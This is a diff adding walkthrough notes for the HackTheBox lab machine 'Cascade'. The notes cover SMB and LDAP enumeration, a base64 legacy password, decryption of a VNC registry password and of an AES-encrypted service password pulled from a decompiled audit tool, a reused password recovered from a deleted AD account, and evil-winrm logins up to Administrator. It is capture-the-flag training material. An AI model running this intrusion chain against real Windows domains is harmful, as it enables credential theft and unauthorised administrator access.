@@ -1,0 +1,59 @@
+┌─[✗]─[htb-riggel@htb-1kcxvdzwvp]─[~]
+└──╼ $smbclient -L cascade
+Enter WORKGROUP\htb-riggel's password: 
+Anonymous login successful
+
+	Sharename       Type      Comment
+	---------       ----      -------
+SMB1 disabled -- no workgroup available
+
+in ldap_enum
+	user Ryan Thompson
+		cascadeLegacyPwd: clk0bjVldmE= (base64 encode of "rY4n5eva")
+
+smbget -rR smb://r.thompson:rY4n5eva@10.129.226.53/Data/IT
+
+have a look at ./Temp/s.smith/'VNC Install.reg'
+	"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
+
+found on the internet a msf script to decrypt the password : https://github.com/frizb/PasswordDecrypts
+	password is "sT333ve2" for s.smith
+
+use evil-winrm to open a powershell with s.smith creds
+    sudo gem install evil-winrm
+    evil-winrm -i cascade -u s.smith -p sT333ve2
+	go to C:\Users\s.smith\Desktop
+		type user.txt
+
+smbclient \\\\10.129.226.53\\Audit$ -U s.smith -c 'prompt OFF;recurse ON;lcd ./Audit;mget *'
+	cat ./Audit/RunAudit.bat
+		see that this file executes CascAudit.exe with database ./Audit/DB/Audit.db
+	file ./Audit/DB/Audit.db
+		this file is a SQLite 3.x database
+		use sqlitebrowser to read it
+		field pwd for the user 'ArkSvc' in table Ldap : BQO5l5Kj9MdErXx6Q6AGOw==
+		base64 decode has no sense -> encrypted password
+
+decompile CascAudit.exe using dnSpy https://github.com/dnSpy/dnSpy/releases
+    can be run on Linux by using wine64 'sudo apt install wine64'
+        wine dnSpy.exe
+            AES128 encryption with key c4scadek3y654321 with mode 1 (CBC) thus initial IV 1tdyjCbY1Ix49842
+            now we have every element to decrypt the password -> w3lc0meFr31nd
+
+evil-winrm -i cascade -u ArkSvc -p w3lc0meFr31nd
+    Get-ADObject -ldapfilter "(&(objectclass=user)(isDeleted=TRUE))" -IncludeDeletedObjects
+        The profile TempAdmin that was seen in the email at the beginning of the box is present in the AD bin
+    Get-ADObject -ldapfilter "(&(objectclass=user)(isDeleted=TRUE)(DisplayName=TempAdmin))" -IncludeDeletedObjects -Properties *
+        we can find a cascadeLegacyPwd field with the string YmFDVDNyMWFOMDBkbGVz
+        base64 decode -> baCT3r1aN00dles
+
+TempAdmin account is disabled HOWEVER it was said in the email that the password of the TempAdmin profile was the same as the Administrator's
+
+=> evil-winrm -i cascade -u Administrator -p baCT3r1aN00dles
+    cd C:/Users/Administrator/Desktop
+    type root.txt
+        => root flag !
+    
+    
+    
+    
